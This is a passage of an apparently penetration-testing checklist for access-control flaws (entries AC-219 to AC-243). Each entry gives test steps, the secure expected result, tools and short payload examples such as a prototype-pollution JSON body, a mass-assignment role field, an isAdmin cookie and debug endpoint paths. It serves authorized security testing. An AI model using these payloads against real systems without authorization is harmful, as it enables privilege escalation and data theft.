**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-219 — Cookie-Based Access Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access controlled by cookie 2. Modify cookie value 3. Bypass restriction 4. Elevated access

**Expected Result:** Cookies should be cryptographically signed

**Payload Example:**

```
isAdmin=true or role=superuser cookie
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Cookie Editor

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-220 — JWT Claim Injection
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Capture JWT 2. Add new claims 3. Forge token 4. Access based on injected claims

**Expected Result:** JWT should validate all claims

**Payload Example:**

```
Add admin:true claim to JWT
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## AC-221 — Race Condition Privilege Escalation
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Request privilege 2. Simultaneously access resource 3. Win race 4. Access before denial

**Expected Result:** Authorization should be atomic

**Payload Example:**

```
Parallel privilege check and resource access
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-222 — Business Logic Access Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Understand access workflow 2. Skip steps 3. Bypass sequential checks 4. Unauthorized access

**Expected Result:** All steps should be verified

**Payload Example:**

```
Skip approval step to access resource
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## AC-223 — Client-Side Access Control
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access blocked in UI 2. Access via API 3. Bypass frontend restriction 4. Backend access

**Expected Result:** Controls should be server-side

**Payload Example:**

```
API access bypassing disabled UI button
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-224 — Metadata-Based Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access restricted by metadata 2. Modify metadata 3. Bypass restriction 4. Access resource

**Expected Result:** Metadata should be immutable by users

**Payload Example:**

```
Modify is_public flag on private resource
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-225 — Time-of-Check Time-of-Use
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Permission checked 2. Permission revoked 3. Action executed 4. Unauthorized action

**Expected Result:** Check and use should be atomic

**Payload Example:**

```
Action executed after permission revoked
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-226 — Prototype Pollution Access Bypass
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Send polluted JSON 2. Modify Object prototype 3. isAdmin becomes true 4. Privilege escalation

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"isAdmin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## AC-227 — Mass Assignment Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Update profile 2. Add privilege fields 3. Escalate access 4. Admin access

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"test",isAdmin:true,role:"superuser"}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## AC-228 — Insecure Direct Object Reference Chain
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Access object A 2. A references object B 3. Access B without check 4. Chained IDOR

**Expected Result:** All references should check auth

**Payload Example:**

```
Access order->user->private_data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-229 — Default Deny Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Default deny policy 2. Find allow rule 3. Exploit allow 4. Bypass default

**Expected Result:** Default deny should be comprehensive

**Payload Example:**

```
Find overlooked allowed resource
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / ffuf

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-230 — Capability URL Abuse
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Receive capability URL 2. Share URL 3. Others access 4. Unintended sharing

**Expected Result:** Capability URLs should be user-bound

**Payload Example:**

```
Share secret URL with others
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-231 — API Gateway Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. API gateway enforces rules 2. Access backend directly 3. Bypass gateway 4. Unprotected access

**Expected Result:** Backend should also enforce rules

**Payload Example:**

```
Direct backend access bypassing gateway
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-232 — Microservice Authorization Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Service A checks auth 2. Calls service B 3. B trusts A 4. Indirect access

**Expected Result:** Each service should verify auth

**Payload Example:**

```
Access via trusted internal service call
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Service Mesh Tools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-233 — Environment-Based Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Prod has access control 2. Access staging/dev 3. Weaker controls 4. Access sensitive data

**Expected Result:** All environments should be secured

**Payload Example:**

```
Access staging.company.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Subdomain Enumeration

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-234 — Debug Endpoint Access
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Find debug endpoints 2. Access without auth 3. Extract sensitive info 4. System compromise

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
/debug /actuator /phpinfo
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## AC-235 — Internal API Exposure
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Find internal API 2. Access from external 3. Bypass internal-only restriction 4. Access internal functions

**Expected Result:** Internal APIs should not be exposed

**Payload Example:**

```
/internal/api accessible externally
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-236 — Access Control Logging Gap
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Attempt unauthorized access 2. Check logs 3. No logging 4. Undetected attacks

**Expected Result:** Access violations should be logged

**Payload Example:**

```
Access attempts not appearing in logs
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Log Analysis

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## AC-237 — Concurrent User Access Conflict
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Two users access same resource 2. Conflicting permissions 3. Race condition 4. Unintended access

**Expected Result:** Concurrent access should be handled

**Payload Example:**

```
Simultaneous conflicting access attempts
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Multiple Sessions

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-238 — Subdomain Access Control
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Main domain secured 2. Find subdomain 3. Weaker controls 4. Access via subdomain

**Expected Result:** All subdomains should be secured

**Payload Example:**

```
api.company.com vs app.company.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Subdomain Tools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-239 — CDN Origin Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. CDN enforces access 2. Find origin server 3. Access directly 4. Bypass CDN controls

**Expected Result:** Origin should also enforce controls

**Payload Example:**

```
Direct access to origin IP
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Shodan / DNS Analysis / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-240 — Load Balancer Session Affinity
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Session on server A 2. Request goes to server B 3. Session not found 4. Access issues or bypass

**Expected Result:** Session should be shared or sticky

**Payload Example:**

```
Session inconsistency across servers
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Multiple Requests

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-241 — Service Account Privilege Abuse
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Compromise service account 2. Excessive privileges 3. Lateral movement 4. Privilege escalation

**Expected Result:** Service accounts should have minimal privileges

**Payload Example:**

```
Use service account for unauthorized access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Cloud Tools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-242 — Temporary Credential Persistence
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. Receive temporary credentials 2. Credentials should expire 3. Still valid after expiry 4. Persistent access

**Expected Result:** Temporary credentials should expire

**Payload Example:**

```
Use expired temporary token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-243 — Delegated Access Abuse
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Access Control

**Test Steps:** 1. User delegates access 2. Delegatee exceeds scope 3. Access beyond delegation 4. Unauthorized actions

**Expected Result:** Delegation scope should be enforced

**Payload Example:**

```
Delegatee accessing non-delegated resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---
